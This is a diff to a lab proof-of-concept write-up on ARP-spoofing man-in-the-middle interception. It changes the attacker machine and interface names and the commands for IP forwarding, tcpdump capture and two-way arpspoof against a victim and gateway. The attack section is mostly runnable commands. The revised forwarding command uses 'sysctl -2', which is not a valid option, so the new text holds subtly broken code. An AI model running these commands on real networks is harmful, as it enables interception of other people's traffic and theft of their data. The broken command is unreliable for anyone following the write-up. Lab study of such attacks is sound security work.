@@ -17,8 +17,9 @@ the attacker's machine instead of each other
 between victim and router.
 
 # Topology
-For this PoC we used two Ubuntu 20.10 machines:
-* Attacker - ip address: 192.168.1.9/24
+For this PoC we used a Kali Linux 2020.10 machine for the attacker and a Ubuntu 
+20.10 machine for the victim:
+* Attacker - ip address: 192.168.1.8/24
 * Victim - ip address: 192.168.1.10/24 
 * Gateway - ip address: 192.168.1.1/24 
 
@@ -26,7 +27,7 @@ For this PoC we used two Ubuntu 20.10 machines:
 The first thing to be done on the attacker's machine is to enable ip forwarding
 using the following command:
 ```
-echo 1 > /proc/sys/net/ipv4/ip_forward
+sysctl -2 net.ipv4.ip_forward=1
 ```
 This way, when the attacker receives packets from the victim, they will be then
 forwarded to the destination ip address.
@@ -36,16 +37,16 @@ that are created or received by the attacker will be captured within a file that
 will be used at the end of the attack. This is done by using the *tcpdump*
 command as it follows:
 ```
-tcpdump -i enp0s3 -Z root -w capture.pcap
+tcpdump -i eth0 -Z root -w capture.pcap
 ```
 
 Finnaly, the attacker can start the ARP spoofing. By running the following commands
 the attacker captures the traffic victim -> router and router -> victim. 
 
 ```
-sudo arpspoof -i enp0s3 -t 192.168.1.10 192.168.1.1 > /dev/null 2> /dev/null &
+sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1 > /dev/null 2> /dev/null &
 
-sudo arpspoof -i enp0s3 -t 192.168.1.1 192.168.1.10 > /dev/null 2> /dev/null &
+sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.10 > /dev/null 2> /dev/null &
 ```
 
 
